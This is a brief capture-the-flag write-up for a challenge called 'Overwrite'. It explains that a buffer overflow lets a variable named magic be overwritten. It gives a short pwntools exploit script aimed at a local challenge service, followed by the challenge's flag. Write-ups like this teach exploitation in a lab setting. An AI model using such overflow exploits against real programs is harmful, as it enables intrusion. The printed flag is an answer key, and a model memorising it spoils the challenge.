# Overwrite

Can you control variables that you don't own?

Author: Nathan

## Solution

The program allows a buffer overflow into a variable called `magic`. To get the flag, the value of magic must be set to `0x69696969`. The script to exploit this flaw is below.

```
from pwn import *
context.log_level = "debug"

p = remote('127.0.0.1', 1342)

p.sendline(b'A' * 28 + p32(0x69696969))
p.interactive()
```

flag:
`gigem{get_clobbered_lmao}`
